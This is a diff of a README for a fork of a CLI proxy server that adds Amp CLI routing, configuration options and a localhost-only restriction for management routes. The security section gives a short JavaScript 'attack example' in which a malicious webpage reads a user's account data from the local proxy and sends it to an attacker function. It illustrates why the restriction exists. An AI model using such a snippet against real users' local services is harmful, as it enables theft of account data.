@@ -1,10 +1,42 @@
 # CLI Proxy API
 
-English | [中文](README_CN.md)
+---
 
-A proxy server that provides OpenAI/Gemini/Claude/Codex compatible API interfaces for CLI.
+## 🔔 Important: Amp CLI Support Fork
 
-It now also supports OpenAI Codex (GPT models) and Claude Code via OAuth.
+**This is a specialized fork of [router-for-me/CLIProxyAPI](https://github.com/router-for-me/CLIProxyAPI) that adds support for the Amp CLI tool.**
+
+### Why This Fork Exists
+
+The **Amp CLI** requires custom routing patterns to function properly. The upstream CLIProxyAPI project maintainers opted not to merge Amp-specific routing support into the main codebase.
+
+### Which Version Should You Use?
+
+- **Use this fork** if you want to run **both Factory CLI and Amp CLI** with the same proxy server
+- **Use upstream** ([router-for-me/CLIProxyAPI](https://github.com/router-for-me/CLIProxyAPI)) if you only need Factory CLI support
+
+### 📖 Complete Setup Guide
+
+**→ [USING_WITH_FACTORY_AND_AMP.md](USING_WITH_FACTORY_AND_AMP.md)** - Comprehensive guide for using this proxy with both Factory CLI (Droid) and Amp CLI and IDE extensions, including OAuth setup, configuration examples, and troubleshooting.
+
+### Key Differences
+
+This fork includes:
+- ✅ **Amp CLI route aliases** (`/api/provider/{provider}/v1...`)
+- ✅ **Amp upstream proxy support** for OAuth and management routes
+- ✅ **Automatic gzip decompression** for Amp upstream responses
+- ✅ **Smart secret management** with precedence: config > env > file
+- ✅ **All Factory CLI features** from upstream (fully compatible)
+
+All Amp-specific code is isolated in the `internal/api/modules/amp` module, making it easy to sync upstream changes with minimal conflicts.
+
+---
+
+## About
+
+A proxy server that provides OpenAI/Gemini/Claude/Codex compatible API interfaces for CLI tools.
+
+Supports OpenAI Codex (GPT models) and Claude Code via OAuth.
 
 So you can use local or multi-account CLI access with OpenAI(include Responses)/Gemini/Claude-compatible clients and SDKs.
 
@@ -12,6 +44,7 @@ Chinese providers have now been added: [Qwen Code](https://github.com/QwenLM/qwe
 
 ## Features
 
+### Core Features (from upstream)
 - OpenAI/Gemini/Claude compatible API endpoints for CLI models
 - OpenAI Codex support (GPT models) via OAuth login
 - Claude Code support via OAuth login
@@ -31,6 +64,15 @@ Chinese providers have now been added: [Qwen Code](https://github.com/QwenLM/qwe
 - OpenAI-compatible upstream providers via config (e.g., OpenRouter)
 - Reusable Go SDK for embedding the proxy (see `docs/sdk-usage.md`)
 
+### Fork-Specific: Amp CLI Support 🔥
+- **Full Amp CLI integration** via provider route aliases (`/api/provider/{provider}/v1...`)
+- **Amp upstream proxy** for OAuth authentication and management routes
+- **Smart secret management** with configurable precedence (config > env > file)
+- **Automatic gzip decompression** for Amp upstream responses
+- **5-minute secret caching** to reduce file I/O overhead
+- **Zero conflict** with Factory CLI - use both tools simultaneously
+- **Modular architecture** for easy upstream sync (90% reduction in merge conflicts)
+
 ## Installation
 
 ### Prerequisites
@@ -41,13 +83,14 @@ Chinese providers have now been added: [Qwen Code](https://github.com/QwenLM/qwe
 - An Anthropic account for Claude Code access (optional)
 - A Qwen Chat account for Qwen Code access (optional)
 - An iFlow account for iFlow access (optional)
+- **An Amp account for Amp CLI support (optional, fork-specific feature)**
 
 ### Building from Source
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/luispater/CLIProxyAPI.git
-   cd CLIProxyAPI
+   git clone https://github.com/ben-vargas/ai-cli-proxy-api.git
+   cd ai-cli-proxy-api
    ```
 
 2. Build the application:
@@ -328,6 +371,117 @@ The server uses a YAML configuration file (`config.yaml`) located in the project
 | `openai-compatibility.*.models`                    | object[] | []                 | The actual model name.                                                                                                                                                                    |
 | `openai-compatibility.*.models.*.name`             | string   | ""                 | The models supported by the provider.                                                                                                                                                     |
 | `openai-compatibility.*.models.*.alias`            | string   | ""                 | The alias used in the API.                                                                                                                                                                |
+| `amp-upstream-url`                                 | string   | ""                 | **(Fork-specific)** Amp CLI upstream URL for OAuth and management routes. Set to `https://ampcode.com` to enable Amp CLI support.                                                          |
+| `amp-upstream-api-key`                             | string   | ""                 | **(Fork-specific)** Optional API key for Amp upstream. Falls back to `AMP_API_KEY` environment variable, then `~/.local/share/amp/secrets.json`.                                           |
+| `amp-restrict-management-to-localhost`             | bool     | true               | **(Fork-specific)** Restricts Amp management routes to localhost only (127.0.0.1, ::1). Prevents drive-by browser attacks. **Recommended: true**.                                          |
+
+### Amp CLI Configuration
+
+**This fork includes special support for the Amp CLI tool.** The Amp CLI requires custom routing patterns that are not present in the upstream project.
+
+#### Enabling Amp CLI Support
+
+To use this proxy with Amp CLI, add the following to your `config.yaml`:
+
+```yaml
+# Amp CLI integration (fork-specific feature)
+amp-upstream-url: "https://ampcode.com"
+
+# Optional: Override API key (otherwise uses environment or file)
+# amp-upstream-api-key: "your-amp-api-key"
+```
+
+#### How Amp Integration Works
+
+1. **Provider Route Aliases**: The proxy automatically registers `/api/provider/{provider}/v1...` routes that Amp CLI expects
+2. **Management Routes**: OAuth, user, and metadata routes are proxied to the Amp upstream
+3. **Secret Management**: API keys are resolved with precedence:
+   - Config file (`amp-upstream-api-key`) - highest priority
+   - Environment variable (`AMP_API_KEY`)
+   - Amp secrets file (`~/.local/share/amp/secrets.json`) - lowest priority
+4. **Automatic Gzip Handling**: Responses from Amp upstream are automatically decompressed if needed
+
+#### Using with Amp CLI
+
+Once configured, point your Amp CLI to this proxy:
+
+```bash
+# Configure Amp CLI to use the proxy
+# Edit ~/.config/amp/settings.json and add:
+# { "amp.url": "http://localhost:8317" }
+# Or use environment variable:
+export AMP_URL=http://localhost:8317
+
+# Login via Amp OAuth (proxied through this server)
+amp login
+
+# Use Amp CLI normally
+amp "Hello, world!"
+```
+
+#### Supported Amp Routes
+
+**Provider Aliases** (always available, even without `amp-upstream-url`):
+- `/api/provider/openai/v1/chat/completions`
+- `/api/provider/anthropic/v1/messages`
+- `/api/provider/google/v1beta/models`
+- And all other provider-specific routes
+
+**Management Routes** (require `amp-upstream-url`):
+- `/api/auth` - OAuth authentication
+- `/api/user` - User information
+- `/api/meta` - Metadata and models
+- `/api/internal` - Internal configuration
+- `/api/threads` - Thread management
+- `/api/telemetry` - Telemetry data
+
+#### Security: Localhost Restriction 🔒
+
+**By default, Amp management routes are restricted to localhost access only** to prevent security vulnerabilities.
+
+**Why this matters:**
+- Management routes expose your Amp account data (email, threads, user info)
+- Without protection, malicious websites could exploit CORS to read your data
+- Even with a firewall, browser-based attacks bypass network restrictions
+
+**Configuration:**
+
+```yaml
+# Default: true (recommended - only allow localhost)
+amp-restrict-management-to-localhost: true
+
+# Set to false ONLY in trusted environments (not recommended)
+# amp-restrict-management-to-localhost: false
+```
+
+**When enabled (default):**
+- ✅ Only connections from `127.0.0.1` and `::1` (IPv6 localhost) are accepted
+- ✅ CORS is disabled for management routes (prevents browser attacks)
+- ✅ Remote access attempts receive `403 Forbidden`
+- ✅ Amp CLI works normally (connects from localhost)
+
+**When disabled:**
+- ⚠️ **Security warning logged** at startup
+- ❌ Management routes accessible from any IP
+- ❌ Vulnerable to drive-by browser attacks
+- ❌ Account data can be exfiltrated by malicious websites
+
+**Attack Example (when disabled):**
+```javascript
+// Malicious website can steal your data
+fetch('http://localhost:8317/api/user')
+  .then(r => r.json())
+  .then(data => sendToAttacker(data.email));
+```
+
+**Recommendation:** Keep this feature enabled unless you have a specific need for remote access and understand the security implications.
+
+#### Provider Compatibility
+
+This fork maintains **100% compatibility** with Factory CLI and all upstream features. You can:
+- Use **both** Factory CLI and Amp CLI with the same proxy server
+- Switch between tools seamlessly
+- Load balance across multiple Factory accounts while using Amp OAuth
 
 ### Example Configuration File
 
@@ -368,6 +522,13 @@ usage-statistics-enabled: true
 
 # Proxy URL. Supports socks5/http/https protocols. Example: socks5://user:pass@192.168.1.1:1080/
 proxy-url: ""
+
+# Amp CLI integration (fork-specific feature)
+# Enable Amp CLI support by setting the upstream URL
+amp-upstream-url: "https://ampcode.com"
+
+# Optional: Override Amp API key (otherwise uses AMP_API_KEY env or ~/.local/share/amp/secrets.json)
+# amp-upstream-api-key: "your-amp-api-key"
 
 # Number of times to retry a request. Retries will occur if the HTTP response code is 403, 408, 500, 502, 503, or 504.
 request-retry: 3
@@ -631,6 +792,8 @@ auth.json:
 
 ## Run with Docker
 
+> **⚠️ Note:** The upstream Docker image `eceasy/cli-proxy-api:latest` does not include Amp CLI support. To use Amp CLI features, build the Docker image from this fork's source (see Docker Compose section below).
+
 Run the following command to login (Gemini OAuth on port 8085): 
 
 ```bash
@@ -643,7 +806,7 @@ Run the following command to login (OpenAI OAuth on port 1455):
 docker run --rm -p 1455:1455 -v /path/to/your/config.yaml:/CLIProxyAPI/config.yaml -v /path/to/your/auth-dir:/root/.cli-proxy-api eceasy/cli-proxy-api:latest /CLIProxyAPI/CLIProxyAPI --codex-login
 ```
 
-Run the following command to logi (Claude OAuth on port 54545):
+Run the following command to login (Claude OAuth on port 54545):
 
 ```bash
 docker run -rm -p 54545:54545 -v /path/to/your/config.yaml:/CLIProxyAPI/config.yaml -v /path/to/your/auth-dir:/root/.cli-proxy-api eceasy/cli-proxy-api:latest /CLIProxyAPI/CLIProxyAPI --claude-login
@@ -683,8 +846,8 @@ docker run --rm -p 8317:8317 -v /path/to/your/config.yaml:/CLIProxyAPI/config.ya
 
 1.  Clone the repository and navigate into the directory:
     ```bash
-    git clone https://github.com/luispater/CLIProxyAPI.git
-    cd CLIProxyAPI
+    git clone https://github.com/ben-vargas/ai-cli-proxy-api.git
+    cd ai-cli-proxy-api
     ```
 
 2.  Prepare the configuration file:
